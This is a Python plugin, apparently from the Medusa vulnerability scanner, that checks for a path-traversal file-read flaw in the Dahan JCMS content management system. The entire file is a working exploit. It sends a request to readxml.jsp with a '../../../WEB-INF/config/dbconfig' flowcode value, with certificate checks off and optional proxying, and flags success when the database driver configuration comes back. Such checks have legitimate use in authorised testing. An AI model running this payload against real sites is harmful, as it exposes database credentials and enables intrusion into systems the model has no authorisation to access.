#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 大汉版通JCMS数据库配置文件读取漏洞
referer: http://www.wooyun.org/bugs/wooyun-2013-046837
author: Ascotbe
reference: Lucifer
description: 大汉JCMS内容管理系统由于对文件读取时没有对文件路径进行过滤，导致可以直接直接读取数据库配置文件,
        由于读取xml文件时没有对传进的参数进行过滤,flowcode参数可控,配置文件地址WEB-INF/config/dbconfig.xml,由于控制了文件后缀,只能读取xml文件。

'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/jcms/workflow/design/readxml.jsp?flowcode=../../../WEB-INF/config/dbconfig"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
    payload_url = scheme+"://"+url+payload
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if con.lower().find('<driver-properties>')!=-1:
            Medusa = "{} 存在大汉版通JCMS数据库读取漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass